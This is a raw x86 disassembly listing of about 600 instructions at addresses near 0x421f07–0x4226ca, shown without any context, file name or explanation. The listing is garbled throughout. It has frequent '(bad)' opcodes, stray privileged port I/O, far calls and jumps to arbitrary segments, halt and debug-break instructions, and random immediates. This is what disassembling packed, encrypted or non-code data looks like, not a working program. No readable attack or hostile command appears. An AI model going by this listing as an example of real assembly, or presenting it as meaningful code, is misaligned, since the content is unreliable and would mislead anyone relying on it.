  421f07:	xrelease mov DWORD PTR [ecx-0x56],edi
  421f0b:	dec    edi
  421f0c:	sub    ebx,DWORD PTR [esi]
  421f0e:	mov    cs,WORD PTR [ecx]
  421f10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f11:	dec    esi
  421f12:	adc    al,0x8
  421f14:	pushf  
  421f15:	adc    eax,ebx
  421f17:	lock sub al,0xa9
  421f1a:	aam    0x1b
  421f1c:	dec    eax
  421f1d:	push   ebp
  421f1e:	inc    eax
  421f1f:	dec    edx
  421f20:	or     eax,0xdb7e8ad2
  421f25:	call   0xff3e:0x3fa915f5
  421f2c:	icebp  
  421f2d:	(bad)  [edi+edx*4]
  421f30:	ror    BYTE PTR ds:0x42ef358d,cl
  421f36:	dec    edx
  421f37:	scas   eax,DWORD PTR es:[edi]
  421f38:	js     0x421f93
  421f3a:	out    0xb2,al
  421f3c:	mov    esp,DWORD PTR [eax+0x779bc211]
  421f42:	fstp   DWORD PTR [ecx-0x6ef341e9]
  421f48:	mov    edi,DWORD PTR [ecx+edx*2+0x14]
  421f4c:	aad    0xb1
  421f4e:	xchg   ecx,eax
  421f4f:	sar    BYTE PTR [ebp-0x6a],1
  421f52:	sub    al,0x1c
  421f54:	ds push ecx
  421f56:	btc    DWORD PTR [edx+0x7f],ecx
  421f5a:	leave  
  421f5b:	cld    
  421f5c:	clc    
  421f5d:	mov    bl,0x6a
  421f5f:	mov    ebp,0x57e56902
  421f64:	lock pushf 
  421f66:	popa   
  421f67:	or     DWORD PTR [edi+0x1a88cf0d],edi
  421f6d:	mov    eax,0xac2b04d5
  421f72:	in     al,0xd9
  421f74:	cwde   
  421f75:	cmp    BYTE PTR [ebx-0x3b],dh
  421f78:	loopne 0x421fda
  421f7a:	pop    esp
  421f7b:	dec    esi
  421f7c:	mov    edx,0x62ba83b0
  421f81:	mov    dl,0x44
  421f83:	xchg   ebx,eax
  421f84:	aaa    
  421f85:	out    0x49,al
  421f87:	out    dx,al
  421f88:	sbb    BYTE PTR [ecx+0x70d24988],0x7f
  421f8f:	imul   ecx,DWORD PTR [eax],0x0
  421f92:	dec    ebp
  421f93:	mov    dh,0x86
  421f95:	ficomp WORD PTR [esp+ebp*2]
  421f98:	pop    es
  421f99:	shl    BYTE PTR [eax+0x44],0xb3
  421f9d:	cmp    al,0xe7
  421f9f:	mov    cl,0x8e
  421fa1:	adc    al,BYTE PTR [eax]
  421fa3:	mov    edx,0xa10f2b9f
  421fa8:	dec    esi
  421fa9:	pop    esi
  421faa:	pop    esi
  421fab:	mov    esp,0x95d5edef
  421fb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421fb1:	cmp    ebp,DWORD PTR [ebp+0x18d43d9b]
  421fb7:	xchg   ecx,eax
  421fb8:	inc    ebp
  421fb9:	test   esp,0x81766c32
  421fbf:	mov    dl,0x1e
  421fc1:	outs   dx,DWORD PTR ds:[esi]
  421fc2:	cmp    BYTE PTR [ebx+edi*4],ch
  421fc5:	sub    cl,al
  421fc7:	aad    0xf1
  421fc9:	push   0x872b4bf3
  421fce:	ss out 0xb7,al
  421fd1:	inc    eax
  421fd2:	ret    0x293
  421fd5:	(bad)  
  421fd6:	mov    esi,0x39c8016f
  421fdb:	ds js  0x421f99
  421fde:	mov    al,ds:0xabe2256e
  421fe3:	add    esp,eax
  421fe5:	(bad)  
  421fe6:	cmc    
  421fe7:	shl    BYTE PTR [eax+0x36],cl
  421fea:	and    ecx,DWORD PTR [edx+0x6b]
  421fed:	aad    0x9d
  421fef:	or     BYTE PTR [edi+0x30873df6],ch
  421ff5:	pop    eax
  421ff6:	ja     0x422026
  421ff8:	sub    dl,BYTE PTR [ebx-0x33]
  421ffb:	sub    eax,0xb673758e
  422000:	cmp    al,0xb2
  422002:	dec    esi
  422003:	nop
  422004:	imul   esi,DWORD PTR [edx+edi*1+0x2a],0xfa4ba222
  42200c:	es gs inc edx
  42200f:	xchg   ebx,eax
  422010:	xor    edx,esi
  422012:	mov    cs,WORD PTR [edx-0x51]
  422015:	cs sbb ch,ah
  422018:	mov    al,ds:0x7d0424f1
  42201d:	imul   edi,edx,0x77
  422020:	sbb    cl,al
  422022:	cmp    eax,0x62c9f689
  422027:	cmp    DWORD PTR [edi+0x4d168eda],0xffffffaa
  42202e:	mov    ebx,0xefd7f9eb
  422033:	jg     0x422092
  422035:	mov    esp,0x69207623
  42203a:	jg     0x42209f
  42203c:	int3   
  42203d:	sbb    esp,DWORD PTR ds:[edx+ecx*4+0x13ada2af]
  422045:	xchg   edx,eax
  422046:	xchg   edx,eax
  422048:	outs   dx,DWORD PTR ds:[esi]
  422049:	inc    ebx
  42204a:	fist   DWORD PTR [eax+0x73]
  42204d:	add    eax,0x5c42eaba
  422052:	pop    esi
  422053:	cmp    BYTE PTR [esi],bl
  422055:	xchg   edx,eax
  422056:	out    dx,al
  422057:	es ins BYTE PTR es:[edi],dx
  422059:	jne    0x4220bd
  42205b:	leave  
  42205c:	scas   eax,DWORD PTR es:[edi]
  42205d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42205e:	into   
  42205f:	or     esp,DWORD PTR [ebp-0x5]
  422062:	fld    QWORD PTR ds:0x9661a938
  422068:	cmp    DWORD PTR [ebx+0x32],esp
  42206b:	call   0xfdb0:0xee09099d
  422072:	rcr    esp,0x50
  422075:	bound  edi,QWORD PTR [ecx+ecx*1+0x57713d8e]
  42207c:	xchg   DWORD PTR [eax-0x50f332cc],ecx
  422082:	and    al,0x63
  422084:	xchg   esp,eax
  422085:	std    
  422086:	xchg   ecx,esp
  422088:	adc    al,dl
  42208a:	push   0x50
  42208c:	out    0x89,eax
  42208e:	pop    esp
  42208f:	jp     0x422081
  422091:	lahf   
  422092:	out    dx,al
  422093:	cmp    al,0x7
  422095:	or     cl,BYTE PTR [eax+0x55]
  422098:	jne    0x422091
  42209a:	ret    
  42209b:	outs   dx,DWORD PTR ds:[esi]
  42209c:	cmp    al,0xf3
  42209e:	xchg   BYTE PTR [edi-0x3e],cl
  4220a1:	leave  
  4220a2:	mov    bh,0x9
  4220a4:	dec    edx
  4220a5:	mov    dl,0xaf
  4220a7:	scas   eax,DWORD PTR es:[edi]
  4220a8:	les    eax,FWORD PTR [edi+0x2929e7b9]
  4220ae:	je     0x422095
  4220b0:	retf   0x8410
  4220b3:	mov    ebp,0xb60da8ec
  4220b8:	rol    DWORD PTR [ebp+0x2f],1
  4220bb:	pushf  
  4220bc:	stos   DWORD PTR es:[edi],eax
  4220bd:	push   esi
  4220be:	sub    al,0x2e
  4220c0:	sar    BYTE PTR [esi+ebx*1+0x31fedf6e],cl
  4220c7:	daa    
  4220c8:	mov    ch,BYTE PTR [edi+eax*2]
  4220cb:	rcl    ch,cl
  4220cd:	pop    esi
  4220ce:	mov    dh,0x30
  4220d0:	add    BYTE PTR [eax-0x5b],bl
  4220d3:	imul   edi,DWORD PTR [edi],0x99a782a1
  4220d9:	jo     0x4220fc
  4220db:	mov    al,ds:0x3c041566
  4220e0:	pop    ebx
  4220e1:	push   0x9d6ca0cf
  4220e6:	cld    
  4220e7:	enter  0xdd7d,0x56
  4220eb:	inc    ebp
  4220ec:	ret    
  4220ed:	lahf   
  4220ee:	ja     0x4220a8
  4220f0:	add    BYTE PTR [ebp+0x46],al
  4220f3:	adc    al,BYTE PTR [ecx-0x35d4bbe4]
  4220f9:	in     al,0x16
  4220fb:	or     dl,BYTE PTR [ebp+0x38fada0f]
  422101:	cwde   
  422102:	lds    edx,FWORD PTR [edi-0x6b]
  422105:	adc    al,0x16
  422107:	ret    
  422108:	mov    ebp,0x1f640d40
  42210d:	push   es
  42210e:	cmp    ebx,ecx
  422110:	mov    DWORD PTR [esi+0x154c2948],ecx
  422116:	jecxz  0x422130
  422118:	rol    DWORD PTR [ebx+0x6af239df],1
  42211e:	mov    ebp,DWORD PTR [ebx]
  422120:	add    ebx,DWORD PTR [esi+0x4c]
  422123:	(bad)  
  422124:	imul   edx,DWORD PTR [edi+ecx*4],0xfffffffc
  422128:	mov    eax,0x4f601dfa
  42212d:	push   edx
  42212e:	rcl    DWORD PTR [ecx+0x54],0x0
  422132:	dec    ebp
  422133:	or     dh,BYTE PTR [esi]
  422135:	jne    0x422161
  422137:	mov    ch,0x41
  422139:	push   cs
  42213a:	xlat   BYTE PTR ds:[ebx]
  42213b:	or     ebp,DWORD PTR es:0xbe98f90c
  422142:	jg     0x422139
  422144:	xlat   BYTE PTR gs:[ebx]
  422146:	mov    eax,DWORD PTR [ebx+esi*8+0x33]
  42214a:	inc    edi
  42214b:	xchg   esi,eax
  42214c:	loope  0x422147
  42214e:	inc    ebp
  42214f:	test   BYTE PTR [esi+0x79bd601c],al
  422155:	hlt    
  422156:	outs   dx,BYTE PTR ds:[esi]
  422157:	ret    
  422158:	add    ecx,esp
  42215a:	or     BYTE PTR [esi],0x62
  42215d:	mov    eax,ds:0xbb0c3a3f
  422162:	jno    0x422122
  422164:	or     DWORD PTR [esp+eiz*2-0x5bcccd46],eax
  42216b:	pop    edx
  42216c:	pop    ds
  42216d:	sbb    eax,esp
  42216f:	fild   QWORD PTR [ebx+esi*1+0xe]
  422173:	jnp    0x422143
  422175:	jns    0x4221c3
  422177:	mov    bh,0x89
  422179:	in     al,0xea
  42217b:	and    BYTE PTR [ebx-0x553a6235],bl
  422181:	add    eax,DWORD PTR [ebx-0x31]
  422184:	jmp    0xe494:0x77d426d0
  42218b:	sar    DWORD PTR [eax],cl
  42218d:	mov    al,ds:0x94411bd4
  422192:	inc    edx
  422193:	ret    0x6533
  422196:	and    bl,BYTE PTR [esi]
  422198:	dec    edi
  422199:	mov    al,0x3c
  42219b:	sbb    ebx,DWORD PTR [edi-0xa]
  42219e:	pusha  
  42219f:	xchg   esi,eax
  4221a0:	arpl   WORD PTR [ebx+eiz*4+0x4613bf9c],bp
  4221a7:	cwde   
  4221a8:	and    bl,ch
  4221aa:	mov    dl,0x2d
  4221ac:	xchg   esi,eax
  4221ad:	das    
  4221ae:	xchg   ebp,eax
  4221af:	lea    ebx,[ebp-0x30]
  4221b2:	sub    cl,0x22
  4221b5:	push   ebp
  4221b6:	imul   ecx,DWORD PTR [ebp+0x4941cabf],0xffffff81
  4221bd:	mov    edi,ecx
  4221bf:	scas   eax,DWORD PTR es:[edi]
  4221c0:	sbb    BYTE PTR [edx+0x6f],bl
  4221c3:	jecxz  0x4221a7
  4221c5:	sahf   
  4221c6:	retf   
  4221c7:	and    al,0x24
  4221c9:	ja     0x422185
  4221cb:	loopne 0x4221b1
  4221cd:	xlat   BYTE PTR ds:[ebx]
  4221ce:	cmp    al,0x1e
  4221d0:	xor    DWORD PTR [ebp+0x7e],eax
  4221d3:	sub    BYTE PTR [ebp-0x6d],dh
  4221d6:	and    ebp,DWORD PTR ds:0x276d65d6
  4221dc:	cmp    DWORD PTR [ebp+edi*4-0x63bbb4d4],esp
  4221e3:	outs   dx,DWORD PTR ds:[esi]
  4221e4:	pusha  
  4221e5:	sbb    ecx,0x76
  4221e8:	push   cs
  4221e9:	daa    
  4221ea:	ret    
  4221eb:	push   edi
  4221ec:	push   esi
  4221ed:	jl     0x4221cc
  4221ef:	scas   al,BYTE PTR es:[edi]
  4221f0:	pop    si
  4221f2:	mov    al,ds:0xec43b593
  4221f7:	ja     0x422198
  4221f9:	and    al,0x52
  4221fb:	test   BYTE PTR [edx],ch
  4221fd:	dec    ecx
  4221fe:	fidivr DWORD PTR [edx]
  422200:	icebp  
  422201:	rol    bl,1
  422203:	sbb    eax,0x3436474
  422208:	jle    0x4221dd
  42220a:	pop    eax
  42220b:	out    0xd5,eax
  42220d:	sub    al,0x49
  42220f:	lods   eax,DWORD PTR ds:[esi]
  422210:	inc    eax
  422211:	xor    BYTE PTR [ecx+0x2a96e27a],ch
  422217:	ss faddp st(7),st
  42221a:	mov    cl,BYTE PTR [edx]
  42221c:	cdq    
  42221d:	mov    ds,WORD PTR [edx]
  42221f:	sbb    DWORD PTR [esi+0x5daa360a],ecx
  422225:	mul    DWORD PTR [eax-0x1f]
  422228:	mov    edi,0x38eebec4
  42222d:	sub    ebp,ecx
  42222f:	and    BYTE PTR [esp+ebx*2+0x23],bh
  422233:	xchg   edx,eax
  422234:	and    edx,DWORD PTR [edx+0x74061883]
  42223a:	inc    ebp
  42223b:	and    eax,0x19d70d32
  422240:	sub    DWORD PTR [ecx+0x35],esp
  422243:	xchg   ecx,eax
  422244:	add    dl,BYTE PTR es:[edx-0x17747c8e]
  42224b:	imul   ebx,DWORD PTR [edi],0x53
  42224e:	(bad)  [ebp-0x99923ca]
  422254:	cmp    esp,edx
  422256:	mov    esp,0x18f640e5
  42225b:	int    0xa0
  42225d:	(bad)  
  42225e:	mov    eax,0xc160f563
  422263:	das    
  422264:	push   es
  422265:	lea    ebp,[ebp-0x29]
  422268:	pop    ecx
  422269:	pop    edx
  42226a:	dec    ecx
  42226b:	push   eax
  42226c:	mov    ebp,0x7e6e516e
  422271:	fisttp WORD PTR [ecx+0x7a]
  422274:	imul   eax,DWORD PTR [edx+0x6c],0xec7af4fa
  42227b:	push   ecx
  42227c:	xchg   BYTE PTR [ebx+0x1f0c28dd],cl
  422282:	inc    ecx
  422283:	and    ecx,DWORD PTR ds:0x66d252d8
  422289:	adc    cl,BYTE PTR [eax-0xd]
  42228c:	les    edx,FWORD PTR [ebx]
  42228e:	ins    DWORD PTR es:[edi],dx
  42228f:	in     eax,0x20
  422291:	add    esp,DWORD PTR ds:[eax-0x63]
  422295:	inc    esp
  422296:	dec    ecx
  422297:	xor    al,0x76
  422299:	loop   0x4222fd
  42229b:	mov    ebp,0xb2c45fac
  4222a0:	jmp    0x42229d
  4222a2:	sub    DWORD PTR [eax+edi*2+0x66be00bf],esp
  4222a9:	sub    al,0xb3
  4222ab:	fs leave 
  4222ad:	cwde   
  4222ae:	rcl    BYTE PTR [edi],1
  4222b0:	iret   
  4222b1:	hlt    
  4222b2:	push   ebx
  4222b3:	ror    esp,cl
  4222b5:	xchg   ebx,ebp
  4222b7:	xor    al,0x87
  4222b9:	int    0x68
  4222bb:	xor    eax,0x980bd513
  4222c0:	mov    al,0xbc
  4222c2:	jge    0x4222de
  4222c4:	ret    
  4222c5:	and    eax,DWORD PTR [ebx]
  4222c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222c8:	dec    edx
  4222c9:	cmc    
  4222ca:	and    ecx,DWORD PTR [esi+0x3900c6a]
  4222d0:	(bad)  
  4222d1:	shr    BYTE PTR [ebx],1
  4222d3:	(bad)  
  4222d4:	adc    eax,0x8c38af4c
  4222d9:	in     al,0x29
  4222db:	mov    edi,0xd757813e
  4222e0:	jle    0x4222a8
  4222e2:	lahf   
  4222e3:	sbb    al,0x81
  4222e5:	repz and DWORD PTR [ebp+0x67a14e2a],esp
  4222ec:	out    0x39,eax
  4222ee:	cmc    
  4222ef:	sbb    ecx,DWORD PTR [eax-0x4b]
  4222f2:	js     0x422366
  4222f4:	or     al,0xb3
  4222f6:	mov    ebp,eax
  4222f8:	jge    0x4222bb
  4222fa:	out    dx,eax
  4222fb:	or     DWORD PTR [eax-0x5d42f7fd],edi
  422301:	lods   eax,DWORD PTR ds:[esi]
  422302:	ficom  DWORD PTR fs:[ecx-0x3d]
  422306:	call   0x7c8d7efc
  42230b:	ror    DWORD PTR [ebp-0x6fce3a72],1
  422311:	jb     0x422309
  422313:	mov    eax,0xea86e0bd
  422318:	push   es
  422319:	addr16 retf 
  42231b:	dec    ebx
  42231c:	sub    esp,DWORD PTR gs:[edi+esi*2+0x5]
  422321:	call   0xe11e:0x19bc329b
  422328:	test   al,0x8a
  42232a:	ds ja  0x422339
  42232d:	clc    
  42232e:	dec    edx
  42232f:	or     dh,BYTE PTR [esi]
  422331:	sbb    eax,0x5d52f745
  422336:	gs xor eax,0xdc394f81
  42233c:	adc    eax,0x513a82df
  422341:	adc    bh,BYTE PTR [ecx-0x40]
  422344:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422345:	mov    WORD PTR [ecx],es
  422347:	jno    0x42238c
  422349:	test   BYTE PTR [ecx-0x693f2551],ah
  42234f:	jmp    0x2980a40e
  422354:	aam    0x19
  422356:	daa    
  422357:	out    0x79,eax
  422359:	dec    DWORD PTR [edx-0x69]
  42235c:	pop    es
  42235d:	retf   0x802a
  422360:	loopne 0x422312
  422362:	sub    esp,DWORD PTR [ebp+0x6b71f8f5]
  422368:	adc    ecx,DWORD PTR [eax]
  42236a:	shr    edx,0x45
  42236d:	inc    ebp
  42236e:	data16 and cl,bl
  422371:	mov    BYTE PTR [eax+eax*4],dh
  422374:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422375:	loope  0x422347
  422377:	cmp    al,0xfa
  422379:	adc    al,0x31
  42237b:	aas    
  42237c:	lods   eax,DWORD PTR ds:[esi]
  42237d:	(bad)  
  42237f:	lock inc eax
  422381:	and    al,0x62
  422383:	daa    
  422384:	mov    bl,0x3e
  422386:	fwait
  422387:	nop
  422388:	dec    esp
  422389:	sar    ebp,0x7d
  42238c:	cmp    DWORD PTR [ebx+0x23],esi
  42238f:	add    ah,bh
  422391:	inc    edi
  422392:	stc    
  422393:	fcmove st,st(5)
  422395:	out    0x1a,al
  422397:	sub    DWORD PTR [eax-0x48],edi
  42239a:	push   ds
  42239b:	fnstcw WORD PTR [edi+0x3b]
  42239e:	getsec 
  4223a0:	inc    esp
  4223a1:	imul   esp,DWORD PTR [edi],0x9c84cbf0
  4223a7:	adc    BYTE PTR [edx+0x79],bh
  4223aa:	ss ja  0x42237c
  4223ad:	adc    al,0xe4
  4223af:	inc    edi
  4223b0:	adc    eax,0x8cb7c8a2
  4223b5:	inc    edi
  4223b6:	xchg   edx,eax
  4223b7:	and    eax,0x74b846cb
  4223bc:	xchg   esp,eax
  4223bd:	dec    eax
  4223be:	out    dx,eax
  4223bf:	sbb    ch,dl
  4223c1:	or     eax,0x7fab3dae
  4223c6:	je     0x422353
  4223c8:	xor    WORD PTR [edi],bp
  4223cb:	nop
  4223cc:	cmc    
  4223cd:	cmp    DWORD PTR [edi-0x11],esp
  4223d0:	fidivr WORD PTR [edx+0x70]
  4223d3:	adc    cl,BYTE PTR [eax-0x16]
  4223d6:	add    al,BYTE PTR [ecx+0x22619420]
  4223dc:	push   edx
  4223dd:	push   eax
  4223de:	inc    ebx
  4223df:	xchg   edx,eax
  4223e0:	push   ecx
  4223e1:	data16 adc al,BYTE PTR [edx-0x12bf12dc]
  4223e8:	daa    
  4223e9:	cwde   
  4223ea:	mov    ch,0xe3
  4223ec:	out    dx,eax
  4223ed:	test   BYTE PTR [edi],bh
  4223ef:	pop    esp
  4223f0:	inc    edx
  4223f1:	fidivr WORD PTR [ebp-0x42]
  4223f4:	cmc    
  4223f5:	jmp    0xbe3c:0xc3eb1e9a
  4223fc:	adc    ch,BYTE PTR [eax+0x575eee4f]
  422402:	mov    ebx,0x5eb46a36
  422407:	fsubp  st(3),st
  422409:	shr    DWORD PTR [ebx-0x47210c67],cl
  42240f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422410:	xor    DWORD PTR [edi-0x30c2602a],ebp
  422416:	pop    edi
  422417:	push   edi
  422418:	sub    cl,cl
  42241a:	cmp    eax,DWORD PTR ds:0x1db94572
  422420:	mov    ah,BYTE PTR [edx-0x76]
  422423:	sub    BYTE PTR [ebp-0x7e],al
  422426:	jl     0x422438
  422428:	mov    al,0x4d
  42242a:	lock xchg ebp,eax
  42242c:	fs mov cl,0xb8
  42242f:	cmp    dl,ah
  422431:	enter  0x4234,0x46
  422435:	xor    ch,BYTE PTR [edx+0x3e]
  422438:	shr    esi,0x30
  42243b:	mov    dl,0xe5
  42243d:	xor    eax,DWORD PTR [edi-0x53]
  422440:	aad    0x44
  422442:	imul   eax,DWORD PTR [ebx-0x4d014747],0x16ea2a47
  42244c:	cmp    al,0x3c
  42244e:	out    0x3,al
  422450:	fwait
  422451:	pop    eax
  422452:	or     eax,0xd247d517
  422457:	mov    DWORD PTR [edx+0x55],edi
  42245a:	sbb    dl,BYTE PTR [esi+0x79cb4a75]
  422460:	(bad)  
  422461:	fucomip st,st(2)
  422463:	push   esi
  422464:	fcmovnb st,st(4)
  422466:	loopne 0x4224bc
  422468:	cmp    edi,DWORD PTR [esp+ebp*1]
  42246b:	mov    eax,ds:0x3574c2c5
  422470:	loope  0x4224e2
  422472:	js     0x422445
  422474:	add    BYTE PTR [edx-0x7],al
  422477:	ja     0x42248d
  422479:	outs   dx,DWORD PTR ds:[esi]
  42247a:	add    eax,0xff9d2159
  42247f:	adc    al,0xb
  422481:	pop    eax
  422482:	fdivr  st(4),st
  422484:	int3   
  422485:	out    dx,al
  422486:	cmp    eax,0xf365a44
  42248b:	or     eax,0xb498845d
  422490:	sub    BYTE PTR [eax],0xc
  422493:	jb     0x4224f6
  422495:	cmc    
  422496:	(bad)  
  422497:	push   esi
  422498:	fist   WORD PTR [edx+ecx*4]
  42249b:	or     al,0xa2
  42249d:	mov    WORD PTR ss:[edi-0x352f6729],es
  4224a4:	les    eax,FWORD PTR [ebx-0x2f]
  4224a7:	and    BYTE PTR [ebx+eax*4-0x330a4abd],bh
  4224ae:	or     dl,bl
  4224b0:	or     DWORD PTR [ebp+eax*1+0x77528c64],ecx
  4224b7:	adc    al,0xe9
  4224b9:	idiv   BYTE PTR [ebp+0x23]
  4224bc:	ins    DWORD PTR es:[edi],dx
  4224bd:	fidivr DWORD PTR [ebx-0x3a6dc359]
  4224c3:	loope  0x4224b8
  4224c5:	scas   eax,DWORD PTR es:[edi]
  4224c6:	push   0xfffffffa
  4224c8:	push   esp
  4224c9:	arpl   WORD PTR [ecx],di
  4224cb:	dec    eax
  4224cc:	aas    
  4224cd:	push   esp
  4224ce:	xchg   ebx,eax
  4224cf:	cmp    BYTE PTR [edi-0x15693c44],cl
  4224d5:	or     al,0xca
  4224d7:	mov    DWORD PTR [ecx],esi
  4224d9:	cmp    dl,BYTE PTR [eax+ebx*2-0x1d]
  4224dd:	xchg   esi,eax
  4224de:	fst    QWORD PTR [edi-0x1e65dbe1]
  4224e4:	fadd   st,st(0)
  4224e6:	xchg   esp,eax
  4224e7:	stc    
  4224e8:	ficomp DWORD PTR [eax]
  4224ea:	jne    0x4224e3
  4224ec:	repz mov eax,DWORD PTR [esi]
  4224ef:	retf   0xf723
  4224f2:	dec    esp
  4224f3:	and    cl,bl
  4224f5:	iret   
  4224f6:	repz adc BYTE PTR [ebx],ah
  4224f9:	push   ebx
  4224fa:	std    
  4224fb:	and    dl,BYTE PTR [ebx+0x7f]
  4224fe:	mov    DWORD PTR [ebx+ebx*4+0x4665338d],edi
  422505:	cmp    eax,0xf0c84e22
  42250a:	stos   DWORD PTR es:[edi],eax
  42250b:	lods   eax,DWORD PTR ds:[esi]
  42250c:	adc    bh,BYTE PTR [edi]
  42250e:	xchg   ecx,eax
  42250f:	(bad)  
  422510:	leave  
  422511:	pop    edi
  422512:	inc    esi
  422513:	sti    
  422514:	daa    
  422515:	sub    eax,0x30368846
  42251a:	popa   
  42251b:	xor    eax,0xb55dd318
  422520:	dec    edx
  422521:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  422523:	mov    eax,ds:0xacbbca2
  422528:	das    
  422529:	lods   al,BYTE PTR ds:[esi]
  42252a:	out    dx,al
  42252b:	add    al,0xe6
  42252d:	es pop esp
  42252f:	das    
  422530:	add    DWORD PTR [eax+0x56],ebx
  422533:	(bad)  
  422534:	cmc    
  422535:	push   esp
  422536:	sub    al,0xb6
  422538:	shr    cl,1
  42253a:	and    BYTE PTR [ebx+0x384dd24c],bl
  422540:	xchg   dh,al
  422542:	icebp  
  422543:	inc    esp
  422544:	(bad)  
  422545:	int    0x0
  422547:	sub    dh,BYTE PTR [edi-0x1d922f14]
  42254d:	aam    0x5d
  42254f:	ds xchg bl,dh
  422552:	in     eax,0x2d
  422554:	pop    eax
  422555:	add    edx,DWORD PTR [ebx-0x11aa98d]
  42255b:	test   al,0x47
  42255d:	add    cl,BYTE PTR [esi+0x9]
  422560:	and    esp,DWORD PTR [ebx-0x71]
  422563:	inc    eax
  422564:	and    DWORD PTR ds:0xa275fd4e,esi
  42256a:	retf   0x59c2
  42256d:	pusha  
  42256e:	sub    al,0x8e
  422570:	push   edx
  422571:	jne    0x42252b
  422573:	je     0x42255d
  422575:	and    ebx,DWORD PTR [ecx]
  422577:	lock rcr cl,0xe4
  42257b:	stos   BYTE PTR es:[edi],al
  42257c:	xlat   BYTE PTR ds:[ebx]
  42257d:	icebp  
  42257e:	mov    bh,0xcb
  422580:	pop    ebx
  422581:	sbb    ebx,DWORD PTR [eax]
  422583:	or     bh,BYTE PTR [eax+0x64bd3640]
  422589:	inc    ebx
  42258a:	mov    dl,0x99
  42258c:	jmp    0x4997:0x76584dd1
  422593:	outs   dx,BYTE PTR ds:[esi]
  422594:	sbb    cl,BYTE PTR [eax]
  422596:	push   edx
  422597:	clc    
  422598:	fs inc edx
  42259a:	cmp    esp,DWORD PTR [esi]
  42259c:	xor    DWORD PTR [ebp+ebp*8-0x521c4d8],esi
  4225a3:	cwde   
  4225a4:	push   esp
  4225a5:	out    dx,eax
  4225a6:	mov    DWORD PTR [edx-0x705798f9],edi
  4225ac:	dec    eax
  4225ad:	(bad)  
  4225af:	out    0x99,al
  4225b1:	lock add al,0x4a
  4225b4:	fcmovbe st,st(1)
  4225b6:	iret   
  4225b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225b8:	jle    0x422605
  4225ba:	rcl    dh,1
  4225bc:	inc    eax
  4225bd:	sub    al,0x30
  4225bf:	ficomp WORD PTR [eax]
  4225c1:	retf   0xa2a7
  4225c4:	(bad)  
  4225c5:	cmc    
  4225c6:	hlt    
  4225c7:	mov    al,ds:0xeae77c9c
  4225cc:	add    DWORD PTR [ecx+0x77],0x29
  4225d0:	adc    BYTE PTR [ecx],dl
  4225d2:	clc    
  4225d3:	pusha  
  4225d4:	jmp    0xa601:0x1711cb62
  4225db:	sub    edi,DWORD PTR [esi+esi*4-0x25924ed4]
  4225e2:	call   DWORD PTR [edi+0x45d3a6c8]
  4225e8:	out    dx,eax
  4225e9:	mov    dh,0x5a
  4225eb:	pop    edi
  4225ec:	inc    esi
  4225ed:	mov    al,0xf
  4225ef:	xor    eax,DWORD PTR [esi]
  4225f1:	out    0xc7,eax
  4225f3:	jnp    0x422584
  4225f5:	fnstcw WORD PTR [eax-0x67]
  4225f8:	outs   dx,DWORD PTR ds:[esi]
  4225f9:	adc    DWORD PTR [ecx+0x64e10c40],edx
  4225ff:	ror    DWORD PTR [edx+0xcace9d3],cl
  422605:	les    ebx,FWORD PTR [esi+edx*1]
  422608:	cli    
  422609:	ja     0x4225ae
  42260b:	mov    edx,0xcca8a2ea
  422610:	dec    esp
  422612:	sbb    DWORD PTR [esp+edi*4+0x4e],edi
  422616:	sub    DWORD PTR [edx],0x2c6a91d
  42261c:	jns    0x4225e1
  42261e:	sti    
  42261f:	mov    edx,0xe247bb46
  422625:	ss out 0x62,eax
  422628:	out    dx,eax
  422629:	adc    BYTE PTR [ebx],0x87
  42262c:	xchg   edx,eax
  42262d:	out    0x3f,eax
  42262f:	in     al,0x50
  422631:	cli    
  422632:	js     0x4225cb
  422634:	jp     0x422661
  422636:	mov    ah,BYTE PTR [eax]
  422638:	ficomp WORD PTR [edx-0x50]
  42263b:	jo     0x42265b
  42263d:	sbb    ecx,ebp
  42263f:	mul    DWORD PTR [esi+0x50d85c86]
  422645:	push   ebp
  422646:	inc    eax
  422647:	test   eax,0xaff41007
  42264c:	push   0xffffffad
  42264e:	outs   dx,BYTE PTR ds:[esi]
  42264f:	stos   DWORD PTR es:[edi],eax
  422650:	addr16 enter 0x68e3,0x9a
  422655:	push   esi
  422656:	cmp    ch,BYTE PTR ds:0xe259e1b7
  42265c:	cdq    
  42265d:	adc    eax,ecx
  42265f:	jg     0x422636
  422661:	outs   dx,BYTE PTR ds:[esi]
  422662:	nop
  422663:	sti    
  422664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422665:	aaa    
  422666:	imul   esi,DWORD PTR [esi-0x74],0xffffffee
  42266a:	dec    ecx
  42266b:	xchg   BYTE PTR [ebx],ah
  42266d:	pop    DWORD PTR [ebp+0x46]
  422670:	mov    ds:0xdff2c94,al
  422675:	fnstsw ax
  422677:	inc    edx
  422678:	adc    al,0xf6
  42267a:	test   al,0x8f
  42267c:	cmp    BYTE PTR [ebx+0x18],cl
  42267f:	push   edi
  422680:	imul   ebx,DWORD PTR [esi],0xffffffc7
  422683:	lahf   
  422684:	lahf   
  422685:	sbb    DWORD PTR [esi-0x654cf4b3],0x63
  42268c:	psraw  mm2,QWORD PTR [ecx]
  42268f:	stos   DWORD PTR es:[edi],eax
  422690:	lods   eax,DWORD PTR ds:[esi]
  422691:	and    edi,edi
  422693:	pop    ecx
  422694:	add    eax,0xe45a2c0b
  422699:	dec    ebx
  42269a:	xchg   ecx,eax
  42269b:	mov    ah,0x45
  42269d:	mov    ebp,0xb60f1105
  4226a2:	popf   
  4226a3:	sbb    eax,0x305c1811
  4226a8:	das    
  4226a9:	or     DWORD PTR [eax+0x4b],esp
  4226ac:	pusha  
  4226ad:	xchg   edi,eax
  4226ae:	repz mov eax,0x1aa7c504
  4226b4:	pop    ebx
  4226b5:	xor    DWORD PTR [edi],ebx
  4226b7:	push   ebp
  4226b8:	in     eax,dx
  4226b9:	nop
  4226ba:	call   0xa7185330
  4226bf:	fwait
  4226c0:	jo     0x422707
  4226c2:	retf   
  4226c3:	cmp    al,0x1d
  4226c5:	retf   0xe908
  4226c8:	add    al,0x62
  4226ca:	mov    bh,0x41
